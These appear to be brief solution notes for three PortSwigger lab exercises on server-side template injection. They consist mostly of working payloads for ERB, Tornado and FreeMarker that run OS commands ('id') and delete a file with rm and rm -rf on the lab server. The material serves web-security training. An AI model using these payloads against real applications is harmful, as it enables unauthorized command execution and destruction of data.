[Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
```shell
The first product was defective.
${2*2}     ->${2*2}
<%= 2*2 %> ->4
message=<%= system("id") %>
<%= system("rm /home/carlos/morale.txt") %>
```
[Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
```shell
My account
Preferred name ->? change
burp
# "}}" 
blog-post-author-display=user.first_name}}{{7*7}}  -->Peter49
blog-post-author-display=user.first_name}}a{*comment*}b  -->Petera{*comment*}b}} 
blog-post-author-display=user.first_name}}${"z".join("ab")}  -->Peter${"z".join("ab")}}}
blog-post-author-display=user.first_name}}{% import os %}{{7*7}} -->Peter49}}
blog-post-author-display=user.first_name}}{% import os %}{{os.system("id")}} --> uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) Peter0}}
blog-post-author-display=user.first_name}}{% import os %}{{os.system("rm /home/carlos/morale.txt")}}
```
[Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
```shell
${7*7}  -> 49
a{*comment*}b ->a{*comment*}b
${"z".join("ab")}  ->parid matn
${"a"=="a"} ->ERROR  ->FreeMarker template ->search
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")} 
->id
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm -rf morale.txt")}
```
